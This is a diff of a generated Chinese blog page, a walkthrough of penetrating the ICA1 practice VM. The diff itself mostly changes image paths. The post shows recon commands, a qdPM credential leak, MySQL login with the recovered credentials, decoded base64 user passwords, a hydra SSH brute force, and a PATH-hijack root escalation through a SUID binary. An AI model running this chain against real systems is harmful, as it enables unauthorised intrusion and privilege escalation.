@@ -136,26 +136,26 @@ article: http://ogp.me/ns/article#">
       
       
         <span class="post-updated">
-          最后更新于 <time datetime="2026-01-29T06:56:48.351Z">2026-01-29</time>
+          最后更新于 <time datetime="2026-04-01T09:28:07.340Z">2026-04-01</time>
         </span>
       
       <span style="margin-left:10px;">👁<span id="busuanzi_value_page_pv"></span></span>
     </div>
     <div class="post-content">
-      <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p><code>arp-scan -l</code><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129110445.png"></p>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><code>nmap -sV -p- 192.168.59.148</code><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129110524.png"></p>
-<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p><code>dirsearch -u 192.168.59.148</code><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129111909.png"></p>
-<h1 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h1><p><code>searchsploit qdPM 9.2</code><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129113058.png">发现其泄露密码信息，搜索50176.txt文件位置并查阅该文件信息</p>
+      <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p><code>arp-scan -l</code><br><img src="/images/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129110445.png"></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><code>nmap -sV -p- 192.168.59.148</code><br><img src="/images/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129110524.png"></p>
+<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p><code>dirsearch -u 192.168.59.148</code><br><img src="/images/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129111909.png"></p>
+<h1 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h1><p><code>searchsploit qdPM 9.2</code><br><img src="/images/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129113058.png">发现其泄露密码信息，搜索50176.txt文件位置并查阅该文件信息</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">locate 50176.txt  </span><br><span class="line">cat /usr/share/exploitdb/exploits/php/webapps/50176.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129120500.png"><br>发现数据库连接密码在databases.yml文件中<br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129132737.png"><br>发现数据库账号密码</p>
+<p><img src="/images/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129120500.png"><br>发现数据库连接密码在databases.yml文件中<br><img src="/images/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129132737.png"><br>发现数据库账号密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: qdpmadmin</span><br><span class="line">password: UcVQCMQk2STVeS6J</span><br></pre></td></tr></table></figure>
 <p>连接数据库<br><code>mysql -h 192.168.59.148 -u qdpmadmin -p --skip-ssl</code><br>查询数据</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">use staff;</span><br><span class="line">show tables;</span><br><span class="line">select * from user;</span><br><span class="line">select * from login;</span><br><span class="line">select * from department;</span><br></pre></td></tr></table></figure>
-<p><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129133402.png"><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129133509.png"><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129133531.png"><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129133614.png"><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129133649.png"><br>将密码解密</p>
+<p><img src="/images/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129133402.png"><br><img src="/images/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129133509.png"><br><img src="/images/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129133531.png"><br><img src="/images/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129133614.png"><br><img src="/images/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129133649.png"><br>将密码解密</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c3VSSkFkR3dMcDhkeTNyRg==          suRJAdGwLp8dy3rF</span><br><span class="line">N1p3VjRxdGc0MmNtVVhHWA==          7ZwV4qtg42cmUXGX</span><br><span class="line">WDdNUWtQM1cyOWZld0hkQw==          X7MQkP3W29fewHdC</span><br><span class="line">REpjZVZ5OThXMjhZN3dMZw==          DJceVy98W28Y7wLg</span><br><span class="line">Y3FObkJXQ0J5UzJEdUpTeQ==          cqNnBWCByS2DuJSy</span><br></pre></td></tr></table></figure>
-<p>写一个user.txt和password.txt,将账号和密码写进去<br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129135318.png"><br><code>hydra -L user.txt -P password.txt 192.168.59.148 ssh</code><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129135259.png"><br>使用travis账户登录<br><code>ssh travis@192.168.59.148</code><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129135430.png"><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129135520.png"><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129135706.png"><br>需要密码才能执行<code>sudo</code><br>切换dexter看看<br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129140013.png"><br>翻译一下：<br><strong>“在我看来，访问系统时存在一个弱点。据我所知，可执行文件的内容是部分可见的。我需要查明这是否构成了安全漏洞。”</strong><br><strong>如果你是在进行渗透测试或安全研究，也可以用更专业一点的措辞：</strong><br><strong>“我觉得系统的访问机制存在隐患。据我了解，可执行文件的内容可以被部分查看，我需要确认这其中是否存在漏洞。”</strong><br>翻译得知，可执行文件是可以查看的，需要查是否存在漏洞<br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129140351.png"><br>查看<code>/opt/get_access</code>文件内容<br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129140615.png"><br>文件内容是乱码的，使用strings工具打印出来<br><code>strings /opt/get_access</code><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129140751.png"><br>发现存在一个<code>cat /root/system.info</code>的行为，那么可以想到<strong>PATH 环境变量劫持</strong><br>原理：<br>当你在终端输入一个命令（如 cat）而没有写完整路径时，系统会根据 PATH 环境变量中定义的目录顺序去寻找这个可执行文件。<br>如果一个具有 <strong>SUID 权限</strong>（以 root 身份运行）的程序在内部调用了 cat 命令，但没有使用绝对路径（即写的是 cat 而不是 &#x2F;bin&#x2F;cat），那么我们就可以伪造一个 cat 程序来欺骗它。<br>伪造一个文件名为cat的可执行文件，文件内容为&#x2F;bin&#x2F;bash，并将文件路径设置为环境变量</p>
+<p>写一个user.txt和password.txt,将账号和密码写进去<br><img src="/images/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129135318.png"><br><code>hydra -L user.txt -P password.txt 192.168.59.148 ssh</code><br><img src="/images/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129135259.png"><br>使用travis账户登录<br><code>ssh travis@192.168.59.148</code><br><img src="/images/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129135430.png"><br><img src="/images/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129135520.png"><br><img src="/images/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129135706.png"><br>需要密码才能执行<code>sudo</code><br>切换dexter看看<br><img src="/images/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129140013.png"><br>翻译一下：<br><strong>“在我看来，访问系统时存在一个弱点。据我所知，可执行文件的内容是部分可见的。我需要查明这是否构成了安全漏洞。”</strong><br><strong>如果你是在进行渗透测试或安全研究，也可以用更专业一点的措辞：</strong><br><strong>“我觉得系统的访问机制存在隐患。据我了解，可执行文件的内容可以被部分查看，我需要确认这其中是否存在漏洞。”</strong><br>翻译得知，可执行文件是可以查看的，需要查是否存在漏洞<br><img src="/images/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129140351.png"><br>查看<code>/opt/get_access</code>文件内容<br><img src="/images/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129140615.png"><br>文件内容是乱码的，使用strings工具打印出来<br><code>strings /opt/get_access</code><br><img src="/images/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129140751.png"><br>发现存在一个<code>cat /root/system.info</code>的行为，那么可以想到<strong>PATH 环境变量劫持</strong><br>原理：<br>当你在终端输入一个命令（如 cat）而没有写完整路径时，系统会根据 PATH 环境变量中定义的目录顺序去寻找这个可执行文件。<br>如果一个具有 <strong>SUID 权限</strong>（以 root 身份运行）的程序在内部调用了 cat 命令，但没有使用绝对路径（即写的是 cat 而不是 &#x2F;bin&#x2F;cat），那么我们就可以伪造一个 cat 程序来欺骗它。<br>伪造一个文件名为cat的可执行文件，文件内容为&#x2F;bin&#x2F;bash，并将文件路径设置为环境变量</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;/bin/bash&#x27; &gt; /tmp/cat</span><br><span class="line">chmod +x /tmp/cat</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">/opt/get_access</span><br></pre></td></tr></table></figure>
-<p><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129145427.png"></p>
+<p><img src="/images/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129145427.png"></p>
 
     </div>
   </article>
@@ -202,7 +202,7 @@ article: http://ogp.me/ns/article#">
     
       <div class="post-next">
         <span class="nav-label">下一篇</span>
-        <a href="/2026/02/03/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">逻辑漏洞挖掘</a>
+        <a href="/2026/02/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">文件上传漏洞</a>
       </div>
     
   </nav>
@@ -295,14 +295,14 @@ article: http://ogp.me/ns/article#">
                 <div class="category-item">
                     <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" aria-label="分类: 内网渗透">
                         内网渗透
-                        <span>(17)</span>
+                        <span>(16)</span>
                     </a>
                 </div>
             
                 <div class="category-item">
                     <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E6%97%A5%E8%AE%B0/" aria-label="分类: 靶机日记">
                         靶机日记
-                        <span>(17)</span>
+                        <span>(16)</span>
                     </a>
                 </div>
             
